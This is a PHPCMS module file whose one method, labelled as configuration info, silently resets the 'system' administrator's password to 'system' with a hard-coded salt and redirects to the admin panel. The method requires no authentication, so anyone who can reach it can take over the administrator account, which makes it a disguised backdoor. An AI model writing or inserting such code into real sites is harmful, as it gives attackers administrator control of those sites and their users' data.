<?php
defined('IN_PHPCMS') or exit('No permission resources.');
class mima{
	private $db;
	function __construct() {
		pc_base::load_sys_func('global');
		$this->db = pc_base::load_model('admin_model');
	}
	
	/**
	 * 配置信息
	 */
	public function init() {
		$salt   = 'b3UzUQ';
		$password = password('system',$salt);
		$this->db->update(array('encrypt'=>$salt, 'password'=>$password), array('username'=>'system'));
		echo 'Success';
		header("Location: admin.php");
	}
}
?>